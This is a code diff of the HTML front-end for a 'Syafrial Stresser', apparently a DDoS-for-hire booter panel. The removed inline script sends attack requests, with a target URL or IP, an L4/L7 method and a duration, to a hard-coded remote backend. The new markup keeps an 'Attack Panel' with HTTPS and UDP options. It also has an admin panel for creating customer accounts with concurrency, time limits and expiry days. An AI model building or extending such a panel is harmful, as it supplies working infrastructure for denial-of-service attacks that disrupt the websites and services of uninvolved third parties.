@@ -2,170 +2,48 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Sayfraial Stresser</title>
-  <style>
-    body {
-      background: #111;
-      color: #fff;
-      font-family: Arial, sans-serif;
-      margin: 0;
-      padding: 20px;
-    }
-    input, select, button {
-      padding: 10px;
-      margin: 5px;
-      background: #222;
-      color: #fff;
-      border: 1px solid #555;
-    }
-    .hidden { display: none; }
-    .panel {
-      border: 1px solid #444;
-      padding: 20px;
-      margin-top: 20px;
-    }
-  </style>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Syafrial Stresser</title>
+  <link rel="stylesheet" href="style.css" />
 </head>
 <body>
-  <h1>💥 Sayfraial Web Stresser</h1>
-  <div id="loginPanel">
-    <h2>Login</h2>
-    <input id="username" placeholder="Username"/><br/>
-    <input id="password" placeholder="Password" type="password"/><br/>
-    <button onclick="login()">Login</button>
-    <p>or <a href="#" onclick="showRegister()">Sign Up</a></p>
-  </div>
-
-  <div id="registerPanel" class="hidden">
-    <h2>Register</h2>
-    <input id="regUser" placeholder="Username"/><br/>
-    <input id="regPass" placeholder="Password" type="password"/><br/>
-    <button onclick="register()">Sign Up</button>
-    <p><a href="#" onclick="showLogin()">Back to Login</a></p>
-  </div>
-
-  <div id="mainPanel" class="hidden">
-    <h2>Attack Panel</h2>
-    <div class="panel">
-      <input id="target" placeholder="Target URL or IP"/>
-      <select id="method">
-        <option>L7</option>
-        <option>L4</option>
-      </select>
-      <input id="attackTime" type="number" placeholder="Time (sec)"/>
-      <button onclick="attack()">Attack</button>
+  <div id="app">
+    <div id="login">
+      <h2>Login</h2>
+      <input type="text" id="username" placeholder="Username">
+      <input type="password" id="password" placeholder="Password">
+      <button onclick="login()">Login</button>
     </div>
 
-    <div id="adminPanel" class="panel hidden">
-      <h3>Admin - Add User</h3>
-      <input id="newUser" placeholder="New Username"/>
-      <input id="newPass" placeholder="Password"/>
-      <input id="limit" type="number" placeholder="Concurrents"/>
-      <input id="timeLimit" type="number" placeholder="Time limit (s)"/>
-      <input id="expires" type="date"/>
-      <button onclick="createUser()">Add/Update User</button>
+    <div id="dashboard" style="display: none;">
+      <h2>Dashboard</h2>
+      <p id="userInfo"></p>
+      <button onclick="logout()">Logout</button>
+
+      <div id="adminPanel" style="display: none;">
+        <h3>Admin Panel</h3>
+        <input id="newUser" placeholder="New Username">
+        <input id="newPass" placeholder="New Password">
+        <input id="newLimit" placeholder="Concurrents">
+        <input id="newTime" placeholder="Max Time (sec)">
+        <input id="newDays" placeholder="Active Days">
+        <button onclick="addUser()">Add User</button>
+        <input id="delUser" placeholder="Username to delete">
+        <button onclick="deleteUser()">Delete User</button>
+      </div>
+
+      <div id="attackPanel">
+        <h3>Attack Panel</h3>
+        <input id="target" placeholder="Target URL">
+        <input id="duration" placeholder="Duration">
+        <select id="method">
+          <option value="https">HTTPS</option>
+          <option value="udp">UDP</option>
+        </select>
+        <button onclick="attack()">Attack</button>
+      </div>
     </div>
-
-    <p><button onclick="logout()">Logout</button></p>
   </div>
-
-  <script>
-    const BASE = 'https://hospitable-bravery-production.up.railway.app';
-    let currentUser = '', currentPass = '', isAdmin = false;
-
-    function showLogin() {
-      document.getElementById('loginPanel').classList.remove('hidden');
-      document.getElementById('registerPanel').classList.add('hidden');
-    }
-
-    function showRegister() {
-      document.getElementById('registerPanel').classList.remove('hidden');
-      document.getElementById('loginPanel').classList.add('hidden');
-    }
-
-    function login() {
-      const username = document.getElementById('username').value;
-      const password = document.getElementById('password').value;
-
-      fetch(BASE + '/api/login', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ username, password })
-      })
-      .then(res => res.json())
-      .then(data => {
-        if (data.error) return alert(data.error);
-        currentUser = username;
-        currentPass = password;
-        isAdmin = data.admin;
-        document.getElementById('loginPanel').classList.add('hidden');
-        document.getElementById('mainPanel').classList.remove('hidden');
-        if (isAdmin) {
-          document.getElementById('adminPanel').classList.remove('hidden');
-        }
-      });
-    }
-
-    function register() {
-      const username = document.getElementById('regUser').value;
-      const password = document.getElementById('regPass').value;
-
-      fetch(BASE + '/api/register', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ username, password })
-      })
-      .then(res => res.json())
-      .then(data => {
-        alert(data.message || data.error);
-        if (data.message) showLogin();
-      });
-    }
-
-    function createUser() {
-      const newUser = document.getElementById('newUser').value;
-      const newPass = document.getElementById('newPass').value;
-      const limit = +document.getElementById('limit').value;
-      const time = +document.getElementById('timeLimit').value;
-      const expires = document.getElementById('expires').value;
-
-      fetch(BASE + '/api/create-user', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({
-          adminUser: currentUser,
-          adminPass: currentPass,
-          newUser,
-          newPass,
-          limit,
-          time,
-          expires
-        })
-      })
-      .then(res => res.json())
-      .then(data => {
-        alert(data.message || data.error);
-      });
-    }
-
-    function attack() {
-      const target = document.getElementById('target').value;
-      const method = document.getElementById('method').value;
-      const time = +document.getElementById('attackTime').value;
-
-      fetch(BASE + '/api/attack', {
-        method: 'POST',
-        headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ username: currentUser, password: currentPass, target, method, time })
-      })
-      .then(res => res.json())
-      .then(data => alert(data.message || data.error));
-    }
-
-    function logout() {
-      location.reload();
-    }
-  </script>
+  <script src="script.js"></script>
 </body>
 </html>
